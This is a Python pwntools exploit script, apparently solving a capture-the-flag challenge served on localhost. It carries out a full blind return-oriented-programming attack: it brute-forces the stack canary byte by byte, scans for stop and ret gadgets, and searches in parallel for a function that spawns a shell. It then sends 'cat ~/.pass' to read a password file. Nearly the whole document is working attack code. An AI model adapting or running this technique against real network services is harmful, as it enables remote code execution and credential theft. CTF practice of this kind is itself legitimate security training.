from pwn import *
from enum import Enum, auto
import multiprocessing
import sys

# Suppress pwntools connection logs for a clean output
context.log_level = 'error'

taddr = "localhost"
tport = 4243
PROMPT = b"[BOBBY] You don't know what you've gotten into: "
TIMEOUT = 2
C = b'X'

class CheckStatus(Enum):
    EXPECTED_RESPONSE = auto()
    TIMEOUT = auto()
    CONNECTION_CLOSED = auto()
    UNEXPECTED_RESPONSE = auto()
    CONNECTION_ERROR = auto()
    PROTOCOL_ERROR = auto()
    SHELLEXECUTOR = auto()

def create_connection():
    """Helper to initialize a remote connection and sync with the prompt."""
    p = remote(taddr, tport, timeout=TIMEOUT)
    p.recvuntil(PROMPT, timeout=TIMEOUT)
    return p

def check_b_crash(payload, b, debug=False):
    p = None
    try:
        p = create_connection()
        p.send(payload + bytes([b]))
        
        expected = ["[BOBBY] Input received.", "[MATRIX] Bobby Newmark — unauthorized access detected."]
        for _ in range(2):
            res = p.recv(timeout=TIMEOUT)
            if not any(exp.encode() in res for exp in expected):
                return False
                
        p.sendline(b"PING")
        return p.connected("recv")
    except (EOFError, PwnlibException, OSError):
        return False
    finally:
        if p: p.close()

def check_crash(payload, debug=False):
    p = None
    try:
        p = create_connection()
        p.send(payload)
        response = p.recvline(timeout=TIMEOUT)
        
        if not p.connected("recv"):
            return CheckStatus.CONNECTION_CLOSED

        for _ in range(4):
            p.send(b"echo PWNED\n")
            res = p.recv(timeout=TIMEOUT)
            if b"PWNED" in res:
                return CheckStatus.SHELLEXECUTOR
            if not p.connected("recv"):
                return CheckStatus.CONNECTION_CLOSED
                
        return CheckStatus.TIMEOUT
    except (EOFError, PwnlibException, OSError) as exc:
        if debug: print("[DEBUG] Connection error:", repr(exc))
        return CheckStatus.CONNECTION_ERROR
    finally:
        if p: p.close()

def check_valid(payload, debug="<X-X>"):
    status = check_crash(payload, True)
    if status in [CheckStatus.CONNECTION_ERROR, CheckStatus.CONNECTION_CLOSED]:
        print(f"[-] Invalid payload [{debug}]: Connection lost 😿", file=sys.stderr)
        exit(1)

def getFlag(payload):
    p = None
    try:
        p = create_connection()
        p.send(payload)
        p.recv(timeout=TIMEOUT) # Ignore standard responses
        p.send(b"cat ~/.pass\n")
        res = p.recv(timeout=TIMEOUT)
        print("Flag{" + res.decode("utf-8", errors="ignore").strip() + "}")
        return True
    except (EOFError, PwnlibException):
        return False
    finally:
        if p: p.close()

def bruteforce_nbyte(payload, n, debug=False):
    bts = b''
    for i in range(n):
        found = False
        for b in range(256):
            tmp = payload + bts
            print(f"[*] Bruteforcing byte {i+1}/{n} : {hex(b)} ...", end='')
            if check_b_crash(tmp, b, debug):
                bts += bytes([b])
                print("\r", end='')
                print(f"[+] 🪨 byte[{i+1}] = {hex(b)}")
                found = True
                break
            print("\r", end='')
        if not found:
            print(f"[x] Byte {i+1} failed to bruteforce!", file=sys.stderr)
            exit(1)
    return bts

# --- EXPLOIT LOGIC ---

# 1. Find Padding
padding = 1
print("[>] Finding padding size...")
while True:
    if check_b_crash(C * padding, 42):
        padding += 1
    else:
        print(f"[+] Padding found: {padding}")
        break

# 2. Brute-force Canary
canary = b'\x00' + bruteforce_nbyte(C * padding + b'\x00', 7)
print(f"[+] Canary: {canary}")
check_valid(C * padding + canary, debug="canary")

building = C * padding + canary + (b'\x00' * 8) # rbp placeholder

# 3. Find STOP Gadget
print("[>] Searching for STOP gadget...")
STOP_GADGET = b''
for b in range(0x610, 0xffff):
    stop = p16(b) + b'\x40\x00\x00\x00\x00\x00'
    if check_crash(building + stop) == CheckStatus.TIMEOUT:
        STOP_GADGET = stop
        print(f"[+] Found STOP gadget: {STOP_GADGET.hex()}")
        break

# 4. Find Return Gadget
print("[>] Searching for RET gadget...")
ret = b''
for b in range(0x610, 0xffff):
    reet = p16(b) + b'\x40\x00\x00\x00\x00\x00'
    status = check_crash(building + reet + STOP_GADGET)
    if status not in [CheckStatus.CONNECTION_ERROR, CheckStatus.CONNECTION_CLOSED]:
        ret = reet
        print(f"[+] Found RET gadget: {ret.hex()}")
        break

building_rbp_ret = C * padding + canary + (b'\x00' * 8) + ret

# 5. Multiprocessing Win Function Search
def find_win(args):
    building_base, stopgadget, start, end, step = args
    for b in range(start, end, step):
        _win = p64(b)
        if check_crash(building_base + _win + stopgadget) == CheckStatus.SHELLEXECUTOR:
            print(f"[+] Found win address: {_win.hex()}", file=sys.stderr)
            return _win
    return None

number_workers = 4
start_val, end_val, step_val = 0x401000, 0x401400, 1
chunk_size = (end_val - start_val) // number_workers
tasks = []

print(f"[>] Starting {number_workers} workers to find win function...")
for i in range(number_workers):
    w_start = start_val + (i * chunk_size)
    w_end = w_start + chunk_size if i < (number_workers - 1) else end_val
    tasks.append((building_rbp_ret, STOP_GADGET, w_start, w_end, step_val))

WIN = b''
with multiprocessing.Pool(processes=number_workers) as pool:
    for result in pool.imap_unordered(find_win, tasks):
        if result:
            WIN = result
            pool.terminate()
            break

if len(WIN) == 8:
    print(f"[+] WIN address acquired: {WIN}")
    getFlag(building_rbp_ret + WIN + STOP_GADGET)
else:
    print("[-] Unable to get a shell!")